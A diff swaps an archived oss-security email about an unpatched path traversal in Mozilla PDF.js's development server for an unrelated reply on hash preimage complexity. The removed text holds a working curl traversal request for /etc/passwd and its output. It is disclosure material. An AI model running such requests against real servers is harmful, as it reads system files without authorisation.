@@ -1,57 +1,19 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/11/24/3
-Message-ID: <CAG8b5tTuLM-jHfWRz1Cvi9K_OAbn7h5EHGh2xicR2YR7Nr45Gw@mail.gmail.com>
-Date: Sat, 24 Nov 2018 13:16:49 +0530
-From: Dhiraj Mishra <mishra.dhiraj95@...il.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/10/18/4
+Message-ID: <20181018151038.yocny6uyklflclka@jwilk.net>
+Date: Thu, 18 Oct 2018 17:10:38 +0200
+From: Jakub Wilk <jwilk@...lk.net>
 To: oss-security@...ts.openwall.com
-Subject: Path traversal in mozilla PDF.js [Unpatched]
+Subject: Re: Travis CI MITM RCE
 Content-Type: text/plain; charset=utf-8
 
-## Summary
-A path traversal issue was observed in Mozilla PDF.js which is a PDF reader
-in JavaScript. This issue was observed while code review of PDF.js
-(gulpfile.js)(
-https://github.com/mozilla/pdf.js/blob/master/gulpfile.js#L1023), Mozilla
-team says "The server with pdf.js is intended to be a development server
-and should not be exposed to public networks. I suppose we could update the
-docs to state that." and a upstream bug was filed against the same (
-https://github.com/mozilla/pdf.js/issues/10249).
+* zugtprgfwprz@...rnkuller.de, 2018-08-31, 22:25:
+>I.e., my point was that for a given key that's uploaded with a fixed 
+>fingerprint, we're not talking about 2^(b/2) collision complexity, but 
+>2^(b-1) second preimage complexity.
 
-## Installation
-PDF.js is built into version 19+ of firefox and a chrome extension is also
-available on chrome web store. To install and get a local copy of PDF.js
-here are the below steps :
-$ git clone https://github.com/mozilla/pdf.js.git
-$ cd pdf.js
-$ npm install -g gulp-cli
-$ npm install
-$ gulp server
+Nitpicking, but for an ideal n-bit hash function, on avergage you need 
+2ⁿ (not 2ⁿ⁻¹) evalutations of the function to find the preimage.
 
-##Exploitation
-I've used the attribute --path-as-is from cURL to verify this issue.
-$ curl --path-as-is -v http://127.0.0.1:8888/../../../../../../etc/passwd
-*   Trying 127.0.0.1...
-* TCP_NODELAY set
-* Connected to 127.0.0.1 (127.0.0.1) port 8888 (#0)
-> GET /../../../../../../etc/passwd HTTP/1.1
-> Host: 127.0.0.1:8888
-> User-Agent: curl/7.58.0
-> Accept: */*
->
-< HTTP/1.1 200 OK
-< Accept-Ranges: bytes
-< Content-Type: application/octet-stream
-< Content-Length: 2745
-< Date: Thu, 15 Nov 2018 06:34:32 GMT
-< Connection: keep-alive
-<
-root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-bin:x:2:2:bin:/bin:/usr/sbin/nologin
-sys:x:3:3:sys:/dev:/usr/sbin/nologin
-sync:x:4:65534:sync:/bin:/bin/sync
-
-
-Thank you
-Dhiraj (@mishradhiraj_)
-
+-- 
+Jakub Wilk
